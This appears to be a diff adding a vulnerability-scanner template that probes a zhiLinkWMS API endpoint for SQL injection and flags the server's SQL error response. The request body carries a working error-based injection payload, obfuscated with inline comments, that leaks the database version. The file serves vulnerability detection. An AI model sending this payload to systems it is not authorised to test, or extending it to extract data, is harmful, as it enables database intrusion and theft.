@@ -1,0 +1,35 @@
+id: zhiLinkWMS-getsyspdaversionlistbyparams-sqlInjection
+
+info:
+  name: zhiLinkWMS-getsyspdaversionlistbyparams-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    zhiLinkWMS-getsyspdaversionlistbyparams-sqlInjection
+
+http:
+  - raw:
+      - |
+        POST /dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "condition": {
+            "field": "createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,version(),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)",
+            "order": "asc"
+        },
+        "current": 1,
+        "size": 1
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "errorMessage"
+          - "SQL"
+        condition: and
